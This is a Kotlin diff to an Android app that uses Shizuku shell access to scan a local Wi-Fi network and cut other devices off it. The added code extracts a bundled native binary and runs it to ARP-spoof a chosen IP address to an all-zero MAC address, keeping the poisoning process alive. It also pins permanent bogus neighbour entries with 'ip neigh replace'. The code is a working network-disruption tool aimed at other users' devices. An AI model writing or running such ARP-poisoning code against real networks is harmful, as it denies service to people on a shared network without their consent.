@@ -2,11 +2,14 @@ package com.drybrine.xcutandroid
 
 import android.app.Activity
 import android.graphics.Typeface
+import android.os.Build
 import android.os.Bundle
+
 import android.widget.Button
 import android.widget.LinearLayout
 import android.widget.ScrollView
 import android.widget.TextView
+import java.io.File
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
@@ -24,6 +27,12 @@ class MainActivity : Activity() {
     private lateinit var listView: LinearLayout
     private lateinit var logView: TextView
 
+    private var netAdmin = false
+    private var netRaw = false
+    private var arpBin: File? = null
+    private var poisonProc: Process? = null
+    private val knownMacs = mutableMapOf<String, String>()
+
     private val binderReceived = Shizuku.OnBinderReceivedListener {
         runOnUiThread { appendLog("binder received") }
     }
@@ -40,19 +49,13 @@ class MainActivity : Activity() {
         Shizuku.addBinderDeadListener(binderDead)
         Shizuku.addRequestPermissionResultListener(permissionResult)
 
-        statusView = TextView(this).apply {
-            text = "Shizuku: check dulu"
-        }
-        capView = TextView(this).apply {
-            typeface = Typeface.MONOSPACE
-        }
+        statusView = TextView(this).apply { text = "Shizuku: check dulu" }
+        capView = TextView(this).apply { typeface = Typeface.MONOSPACE }
         logView = TextView(this).apply {
             typeface = Typeface.MONOSPACE
             textSize = 11f
         }
-        listView = LinearLayout(this).apply {
-            orientation = LinearLayout.VERTICAL
-        }
+        listView = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL }
 
         val scroll = ScrollView(this).apply {
             addView(LinearLayout(this@MainActivity).apply {
@@ -69,7 +72,7 @@ class MainActivity : Activity() {
                 })
                 addView(capView)
                 addView(Button(this@MainActivity).apply {
-                    text = "Scan (ip neigh)"
+                    text = "Scan (raw ARP)"
                     setOnClickListener { scan() }
                 })
                 addView(listView)
@@ -81,6 +84,7 @@ class MainActivity : Activity() {
 
     override fun onDestroy() {
         super.onDestroy()
+        poisonProc?.destroy()
         Shizuku.removeBinderReceivedListener(binderReceived)
         Shizuku.removeBinderDeadListener(binderDead)
         Shizuku.removeRequestPermissionResultListener(permissionResult)
@@ -99,26 +103,78 @@ class MainActivity : Activity() {
     private fun checkStatus() {
         scope.launch {
             val caps = ShizukuShell.capabilities()
+            netAdmin = caps["CAP_NET_ADMIN"] == "true"
+            netRaw = caps["CAP_NET_RAW"] == "true"
             statusView.text = "Shizuku binder: ${if (Shizuku.pingBinder()) "LIVE" else "MATI"}"
             capView.text = buildString {
                 append("uid shell: ").append(caps["uid"]).append('\n')
                 append("CapEff: ").append(caps["cap_eff"]).append('\n')
-                append("CAP_NET_RAW  : ").append(caps["CAP_NET_RAW"]).append('\n')
-                append("CAP_NET_ADMIN: ").append(caps["CAP_NET_ADMIN"])
+                append("CAP_NET_RAW  : ").append(netRaw).append('\n')
+                append("CAP_NET_ADMIN: ").append(netAdmin)
             }
-            appendLog("cekap: ${caps["CAP_NET_ADMIN"] == "true"}")
+            appendLog("backend ARP: ${backendName()}")
+        }
+    }
+
+    private fun backendName() =
+        if (netAdmin) "ip neigh (NET_ADMIN)"
+        else if (netRaw) "raw socket (NET_RAW)"
+        else "TIDAK ADA - perlu NET_ADMIN atau NET_RAW"
+
+    private fun extractArpBin(): File? {
+        arpBin?.takeIf { it.exists() }?.let { return it }
+        val abi = Build.SUPPORTED_ABIS.firstOrNull()
+            ?: run { appendLog("no supported abi"); return null }
+        return try {
+            val out = File(cacheDir, "arp").apply {
+                outputStream().use { dst ->
+                    assets.open("$abi/arp").use { it.copyTo(dst) }
+                }
+                setExecutable(true, false)
+            }
+            arpBin = out
+            appendLog("native arp binary: $abi/$out.name")
+            out
+        } catch (e: Exception) {
+            appendLog("extract arp binary gagal: $e")
+            null
         }
     }
 
     private fun scan() {
         scope.launch {
             val r = ShizukuShell.run("ip neigh")
+            val neighDevices = parseNeigh(r.stdout)
+            knownMacs.clear()
+            val devices = if (netAdmin) {
+                neighDevices
+            } else {
+                val raw = rawScan()
+                if (raw.isNotEmpty()) raw else {
+                    appendLog("raw scan kosong, pakai ip neigh")
+                    neighDevices
+                }
+            }
             listView.removeAllViews()
-            appendLog("scan -> exit ${r.exit}")
-            if (r.stderr.isNotBlank()) appendLog(r.stderr)
-            parseNeigh(r.stdout).forEach { addRow(it) }
-            if (r.stdout.isBlank()) appendLog("(neighbor table kosong)")
+            devices.forEach {
+                if (it.mac.isNotBlank()) knownMacs[it.ip] = it.mac
+                addRow(it)
+            }
+            if (devices.isEmpty()) appendLog("(tidak ada device)")
         }
+    }
+
+    private suspend fun rawScan(): List<Neighbor> {
+        val bin = extractArpBin() ?: return emptyList()
+        val r = ShizukuShell.run("ARP_IFACE=wlan0 ${bin.absolutePath} scan")
+        if (r.exit != 0) {
+            appendLog("raw scan exit ${r.exit}: ${r.stderr.trim()}")
+            return emptyList()
+        }
+        return r.stdout.lineSequence().mapNotNull { line ->
+            val parts = line.trim().split(' ')
+            if (parts.size == 2) Neighbor(parts[0], "wlan0", parts[1], "raw") else null
+        }.toList()
     }
 
     private fun parseNeigh(raw: String): List<Neighbor> {
@@ -152,15 +208,45 @@ class MainActivity : Activity() {
 
     private fun cut(ip: String, dev: String) {
         scope.launch {
-            val r = ShizukuShell.run("ip neigh replace $ip lladdr 00:00:00:00:00:00 dev $dev nud permanent")
-            appendLog("cut $ip -> exit ${r.exit} ${r.stderr.trim()}")
+            if (netAdmin) {
+                val r = ShizukuShell.run("ip neigh replace $ip lladdr 00:00:00:00:00:00 dev $dev nud permanent")
+                appendLog("cut $ip -> exit ${r.exit} ${r.stderr.trim()}")
+            } else if (netRaw) {
+                rawSpoof(ip)
+            } else {
+                appendLog("cut gagal: tidak ada capability. Jalankan 'Cek status' dulu")
+            }
+        }
+    }
+
+    private suspend fun rawSpoof(ip: String) {
+        val bin = extractArpBin() ?: return
+        poisonProc?.destroy()
+        try {
+            poisonProc = ShizukuShell.start("${bin.absolutePath} spoof $ip 00:00:00:00:00:00")
+            appendLog("poison $ip via raw socket (ARP)")
+        } catch (e: Exception) {
+            appendLog("spoof gagal: $e")
         }
     }
 
     private fun uncut(ip: String, dev: String) {
         scope.launch {
-            val r = ShizukuShell.run("ip neigh del $ip dev $dev")
-            appendLog("uncut $ip -> exit ${r.exit} ${r.stderr.trim()}")
+            if (netAdmin) {
+                val r = ShizukuShell.run("ip neigh del $ip dev $dev")
+                appendLog("uncut $ip -> exit ${r.exit} ${r.stderr.trim()}")
+            } else {
+                poisonProc?.destroy()
+                poisonProc = null
+                val bin = extractArpBin()
+                val real = knownMacs[ip]
+                if (bin != null && real != null) {
+                    val r = ShizukuShell.run("${bin.absolutePath} restore $ip $real")
+                    appendLog("restore $ip -> exit ${r.exit} ${r.stderr.trim()}")
+                } else {
+                    appendLog("uncut $ip: poison dihentikan (mac asli tak dikenal: $real)")
+                }
+            }
         }
     }
 
